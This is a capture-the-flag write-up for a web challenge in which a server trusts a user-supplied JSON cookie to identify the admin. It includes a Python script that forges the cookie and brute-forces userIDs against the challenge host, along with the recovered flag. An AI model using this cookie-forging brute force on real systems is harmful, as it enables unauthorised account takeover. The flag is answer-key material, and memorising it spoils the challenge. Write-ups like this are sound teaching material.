# Message-Board

Application uses cookie: `j:{"userID":"972","username":"kupatergent"}` to recognize the user. 

```javascript
app.get("/", (req, res) => {
    const admin = users.find(u => u.username === "admin")
    if(req.cookies && req.cookies.userData && req.cookies.userData.userID) {
        const {userID, username} = req.cookies.userData
        if(req.cookies.userData.userID === admin.userID) res.render("home.ejs", {username: username, flag: process.env.FLAG})
        else res.render("home.ejs", {username: username, flag: "no flag for you"})
    } else {
        res.render("unauth.ejs")
    }
})
```

When doing a get request, it checks if cookie's userID is same as admin's. Since default user's userID is 972, I guessed that admin's must be bruteforcable. 

I created a small bruteforce script.

```python
import requests
import re

url = "https://message-board.hsc.tf/"

for id in range(750, 900):
    cookies = {"userData": 'j:{"userID":"%s","username":"admin"}' % id}
    r = requests.get(url, cookies=cookies)
    print(f"[+] id: {id} - length: {len(r.content)}")
    if len(r.content) != 1813:
        print("[!] Found the flag")
        print(re.findall("flag{.*}", r.text)[0])
        break


```

Admin userID is 768
## Flag
flag{y4m_y4m_c00k13s}